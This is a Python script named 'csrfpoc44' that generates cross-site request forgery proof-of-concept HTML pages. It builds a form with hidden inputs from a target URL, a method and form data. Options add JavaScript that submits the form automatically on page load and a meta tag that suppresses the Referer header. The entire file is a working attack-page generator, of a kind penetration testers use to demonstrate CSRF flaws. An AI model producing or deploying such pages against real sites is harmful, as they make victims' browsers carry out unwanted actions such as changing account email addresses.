#!/usr/bin/python3
import sys,getopt
from termcolor import colored

def usage():
	print(colored("--------[ csrfpoc44 ]--------","red"))
	print(colored("-h --> Help","yellow"))
	print(colored("-u <url> --> Url","yellow"))
	print(colored("-m <method> --> Method (Default: GET)","yellow"))
	print(colored("-d <data> --> Data","yellow"))
	print(colored("-o <filename> --> Output File Name","yellow"))
	print(colored("-a --> Auto Submit","yellow"))
	print(colored("-------< EXTRAS >-------","red"))
	print(colored("--no-referrer --> No Referrer Meta Tag","yellow"))
	print(colored("-----------------------------","yellow"))
	print(colored("Example: ./csrfpoc44 -u http://example.com/change_email -m POST -d email=test@example.com","yellow"))
	sys.exit(0)

if not len(sys.argv[1:]):
	usage()

opts,args = getopt.getopt(sys.argv[1:],"hau:m:d:o:n",["no-referrer"])

head = "\n<title>CSRF PoC</title>\n"
body = "\n<form action=\"{}\" method=\"{}\">\n{}<input type=\"submit\" value=\"Submit Request!\">\n</form>\n<p>CSRF PoC Generated by csrfpoc44</p>"

submit_url = ""
method = "GET"
data = {}
output = ""
auto = False
noReferrer = False

for o,a in opts:
	if o in ("-h"):
		usage()
	if o in ("-u"):
		submit_url = a
	if o in ("-m"):
		method = a
	if o in ("-o"):
		output = a
	if o in ("-a"):
		auto = True
	if o in ("-d"):
		data = {}
		data_split = a.split("&")
		for dt in data_split:
			data[dt.split("=")[0]] = dt.split("=")[1]
	if o in ("--no-referrer"):
		noReferrer = True

if not len(submit_url):
	print(colored("You need to specify url!","red"))
	usage()
	sys.exit(0)

if not len(data):
	print(colored("You need to specify (POST/GET) data!","red"))
	usage()
	sys.exit(0)

input_temp = ""
for dt in data:
	input_temp+="<input type=\"hidden\" name=\"{}\" value=\"{}\">\n".format(dt,data[dt])

if auto:
	body+="\n<script>document.forms[0].submit()</script>\n"

if noReferrer:
	head+="<meta name=\"referrer\" content=\"no-referrer\">\n"

body = body.format(submit_url,method,input_temp)
template = "<html>\n<head>{}</head>\n<body>{}</body>\n</html>".format(head,body)

if output == "":
	output = open("PoC.html","w")
else:
	output = open(output+".html","w")
output.write(template)
output.close()
